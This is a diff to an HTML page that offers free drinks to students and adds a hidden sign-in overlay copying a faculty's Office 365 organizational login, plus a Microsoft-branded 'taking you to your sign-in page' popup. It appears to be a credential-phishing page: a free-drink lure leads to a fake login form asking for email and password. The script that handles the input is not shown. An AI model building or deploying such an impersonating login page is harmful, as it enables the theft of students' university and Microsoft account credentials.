@@ -5,9 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Бесплатно пиће за студенте</title>
     <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/5/w3.css" />
   </head>
   <body>
-    <div class="fon-container">
+    <div class="fon-container block" id="fon-container">
       <div class="logo-container">
         <img class="fon-logo" src="./ASSETS/Fon-Logo-Main.png" alt="Fon logo" />
         <svg
@@ -91,7 +92,41 @@
         <br /><br />
       </div>
     </div>
-    <div class="overlay-container"></div>
+    <div class="overlay-container hidden" id="overlay-container">
+      <div class="input-container">
+        <img src="./ASSETS/Fon-Logo.jpg" alt="" />
+        <span>Sign in with your organizational account</span>
+        <input type="text" placeholder="Someone@Example.com" />
+        <input type="password" placeholder="Password" />
+        <button>Sign in</button>
+        <span
+          >Ovaj portal je namenjen za prijavu na fakultetske servise koji
+          uključuju i Office 365.</span
+        >
+      </div>
+    </div>
+    <div
+      class="microsoft-popup-container hidden"
+      id="microsoft-popup-container"
+    >
+      <div class="microsoft-popup">
+        <img
+          src="./ASSETS/Microsoft_logo_(2012).svg.png"
+          alt="microsoft-logo"
+          class="microsoft-logo"
+        />
+        <span
+          >Taking you to your <br />
+          organization's sign-in page</span
+        >
+        <div class="loading-dots-container">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+        <a href="https://fon-aparati.vercel.app">Cancel</a>
+      </div>
+    </div>
 
     <script src="script.js"></script>
   </body>
